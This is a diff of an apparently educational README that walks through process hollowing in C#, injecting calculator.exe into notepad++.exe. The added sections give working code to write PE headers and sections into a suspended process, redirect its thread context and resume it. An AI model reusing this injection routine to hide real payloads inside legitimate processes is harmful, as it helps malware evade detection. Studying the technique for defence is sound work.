@@ -1,42 +1,13 @@
 # ProcessInjector.NET
 Understanding one of the the Process Hollowing technique used by Malware Authors
 
+![PE Injection](https://user-images.githubusercontent.com/12537739/123103105-4688f480-d468-11eb-83a0-7a3ea3d8dff5.gif)
+
+
 
 # TLDR
 
 I want to try to inject a `calculator.exe` into `notepad++.exe` using the `Process Hollowing` technique.
-
-- [Overview of  Process Hollowing aka (Process Replacement/RunPE)](#overview-of--process-hollowing-aka--process-replacement-runpe-)
-- [Creating our Victim Process](#creating-our-victim-process)
-  * [CreateProcessA Parameters](#createprocessa-parameters)
-    + [lpApplicationName](#lpapplicationname)
-    + [lpCommandLine](#lpcommandline)
-    + [lpProcessAttributes](#lpprocessattributes)
-    + [lpThreadAttributes](#lpthreadattributes)
-    + [bInheritHandles](#binherithandles)
-    + [dwCreationFlags](#dwcreationflags)
-    + [lpEnvironment](#lpenvironment)
-    + [lpStartupInfo](#lpstartupinfo)
-    + [lpProcessInformation](#lpprocessinformation)
-  * [Code Example](#code-example)
-- [Getting ThreadContext](#getting-threadcontext)
-  * [GetThreadContext Parameters](#getthreadcontext-parameters)
-    + [hThread](#hthread)
-    + [lpContext](#lpcontext)
-  * [Code Example](#code-example-1)
-- [Getting ImageBase from our victim process](#getting-imagebase-from-our-victim-process)
-  * [ReadProcessMemory Parameters](#readprocessmemory-parameters)
-    + [hProcess](#hprocess)
-    + [lpBaseAddress](#lpbaseaddress)
-    + [lpBuffer](#lpbuffer)
-    + [nSize](#nsize)
-    + [lpNumberOfBytesRead](#lpnumberofbytesread)
-  * [Code Example](#code-example-2)
-- [Hollowing our Victim Process](#hollowing-our-victim-process)
-  * [ZwUnmapViewOfSection Parameters](#zwunmapviewofsection-parameters)
-    + [ProcessHandle](#processhandle)
-    + [BaseAddress](#baseaddress)
-  * [Code Example](#code-example-3)
 
 
 # Overview of  Process Hollowing aka (Process Replacement/RunPE)
@@ -522,3 +493,186 @@ uint sizeOfVirusImage = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew +
 IntPtr allocatedNewRegionForVirus =  PInvoke.VirtualAllocEx(victimProcessHandle, (IntPtr)virusImageBase, sizeOfVirusImage, PInvoke.AllocationType.Reserve | PInvoke.AllocationType.Commit, PInvoke.MemoryProtection.ExecuteReadWrite);
 
 ```
+
+# Rewriting PE Headers
+Now that we have allocated space for the malware, we are going to first copy the headers.
+
+
+We are going to use the `WriteProcessMemory` function. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).
+
+```cpp
+BOOL WriteProcessMemory(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
+```
+
+## WriteProcessMemory Parameters
+
+### hProcess
+
+A handle to the process memory to be modified.
+
+This will be our `victimProcessHandle` that we obtained earlier.
+
+### lpBaseAddress
+
+A pointer to the base address in the specified process to which data is written.
+
+This will be the `allocatedNewRegionForVirus` which we obtained from `VirtualAllocEx`.
+
+### lpBuffer
+
+A pointer to the buffer that contains data to be written in the address space of the specified process.
+
+This will be our pointer to the malware image, in our case, `Calculator.exe`.
+
+### nSize
+
+The number of bytes to be written to the specified process.
+
+We need to get the size of the headers from the PE file. It is at an offset `0x54` from the start of the PE Header.
+
+```cs
+uint sizeOfVirusHeaders = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x54);
+```
+
+
+### lpNumberOfBytesWritten
+
+For simplicity, I will be ignoring this field by using `C#'s` discard variable, `_`.
+
+## Code Example
+
+```cs
+ uint sizeOfVirusHeaders = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x54);
+ if (!PInvoke.WriteProcessMemory(victimProcessHandle, allocatedNewRegionForVirus, virusFilePointer, sizeOfVirusHeaders, out _))
+ {
+     Console.WriteLine("Writing headers failed...");
+     return;
+ };
+```
+
+# Writing the Sections
+
+In order to locate and write the sections, we need 3 important information. The `NumberOfSections`, `SizeOfOptionalHeaders` and the `SizeOfImageSectionHeader`.
+
+
+![image](https://user-images.githubusercontent.com/12537739/123084407-a7f29880-d453-11eb-94ee-bcc60de47843.png)
+
+
+From the image above, we can obtain the `NumberOfSections` and `SizeOfOptionalHeaders` by
+
+```cs
+int numberOfSections = Marshal.ReadInt16(virusFilePointer, virusElfanew + 0x6);
+int sizeOfOptionalHeader = Marshal.ReadInt16(virusFilePointer + virusElfanew + 0x10 + 0x04);
+```
+
+Then I got the `IMAGE_SECTION_HEADER` definition from [PINVOKE.NET](http://pinvoke.net/default.aspx/Structures/IMAGE_SECTION_HEADER.html).
+
+```cs
+[StructLayout(LayoutKind.Explicit)]
+public struct IMAGE_SECTION_HEADER
+{
+    [FieldOffset(0)]
+    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+    public char[] Name;
+
+    [FieldOffset(8)]
+    public UInt32 VirtualSize;
+
+    [FieldOffset(12)]
+    public UInt32 VirtualAddress;
+
+    [FieldOffset(16)]
+    public UInt32 SizeOfRawData;
+
+    [FieldOffset(20)]
+    public UInt32 PointerToRawData;
+
+    [FieldOffset(24)]
+    public UInt32 PointerToRelocations;
+
+    [FieldOffset(28)]
+    public UInt32 PointerToLinenumbers;
+
+    [FieldOffset(32)]
+    public UInt16 NumberOfRelocations;
+
+    [FieldOffset(34)]
+    public UInt16 NumberOfLinenumbers;
+
+    [FieldOffset(36)]
+    public DataSectionFlags Characteristics;
+
+    public string Section
+    {
+        get { return new string(Name); }
+    }
+}
+```
+
+![image](https://user-images.githubusercontent.com/12537739/123085946-6e229180-d455-11eb-8bce-3ae34b1d4f24.png)
+
+
+With that, we can get the size of a `Section`.
+```cs
+int sizeOfImageSectionHeader = Marshal.SizeOf<PInvoke.IMAGE_SECTION_HEADER>();
+```
+
+We can now loop through all the sections and map them.
+
+```cs
+ int numberOfSections = Marshal.ReadInt16(virusFilePointer, virusElfanew + 0x6);
+ int sizeOfOptionalHeader = Marshal.ReadInt16(virusFilePointer + virusElfanew + 0x10 + 0x04);
+ int sizeOfImageSectionHeader = Marshal.SizeOf<PInvoke.IMAGE_SECTION_HEADER>();
+ for (int i = 0; i < numberOfSections; i++)
+ {
+     IntPtr sectionHeaderPointer = virusFilePointer + virusElfanew + 0x18 + sizeOfOptionalHeader + (i * sizeOfImageSectionHeader);
+     PInvoke.IMAGE_SECTION_HEADER sectionHeader = Marshal.PtrToStructure<PInvoke.IMAGE_SECTION_HEADER>(sectionHeaderPointer);
+
+     uint virtualAddress = sectionHeader.VirtualAddress;
+     uint sizeOfRawData = sectionHeader.SizeOfRawData;
+     uint pointerToRawData = sectionHeader.PointerToRawData;
+
+     byte[] bRawData = new byte[sizeOfRawData];
+     Buffer.BlockCopy(virusFileBytes, (int)pointerToRawData, bRawData, 0, bRawData.Length);
+
+     PInvoke.WriteProcessMemory(victimProcessHandle, (IntPtr)(virusImageBase + virtualAddress), Marshal.UnsafeAddrOfPinnedArrayElement(bRawData, 0), (uint)bRawData.Length, out _);
+
+ }
+```
+
+# Update our ThreadContext and Resume
+
+We need to update our ThreadContext's `ImageBase` and `EntryPoint`.
+
+```cs
+ 
+ byte[] bImageBase = BitConverter.GetBytes((long)virusImageBase);
+ if (!PInvoke.WriteProcessMemory(victimProcessHandle, (IntPtr)victimImageBaseAddress, bImageBase, 0x8, out _))
+ {
+     Console.WriteLine("Rewriting image base failed...");
+     return;
+ }
+ 
+ int virusEntryPointRVA = Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x28);
+ victimThreadContext.Rcx = (ulong)allocatedNewRegionForVirus +  (ulong)virusEntryPointRVA;
+ Marshal.StructureToPtr(victimThreadContext, pVictimThreadContext, true);
+
+ PInvoke.SetThreadContext(victimThreadHandle, pVictimThreadContext);
+ 
+```
+
+# Resume Thread
+
+Finally, we resume the thread.
+
+```cs
+PInvoke.ResumeThread(victimThreadHandle);
+```
+
+Process Hollowing Complete.
